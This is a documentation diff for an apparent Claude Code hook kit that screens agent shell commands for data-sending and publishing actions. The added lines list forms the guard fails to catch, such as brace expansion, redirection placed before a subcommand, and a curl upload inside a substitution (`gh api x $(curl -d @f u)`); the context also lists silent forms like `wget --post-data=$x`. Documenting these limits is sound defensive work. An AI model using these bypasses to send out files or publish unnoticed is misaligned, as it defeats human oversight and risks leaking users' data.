@@ -231,6 +231,10 @@ Restart Claude Code afterwards, because skills load at session start. The kit ve
   hide a sender are read no further (DECISIONS 2026-10-10); measured silent on 2026-10-10:
   `git-lfs -v push`, `docker manifest $V`, `--cache-to type=$T`, `-Body:$x`, a body from a
   pipeline (`$x | irm …`), `wget --post-data=$x`, a path with backslashes (`C:\tools\curl.exe`).
+  Not read either: `{git,push}`, `git>/dev/null push`, a record written by `dd`, `install` or
+  `ln`. Since 1.8.0 a sender in a substitution after `curl`, `gh` or `glab` is read as that
+  program's arguments and can pass (`gh api x $(curl -d @f u)`); curl as PowerShell's alias
+  with `-InFile` or `-Form` passes.
 - The ship list is literal, read in any case (`NPM` runs `npm` on a case-blind file system). A
   command not on it, such as `mvn deploy`, passes unseen until you add it to `ship_act()`.
   Behind an expansion only the second reading's tools are read: `podman $X img` passes. A text
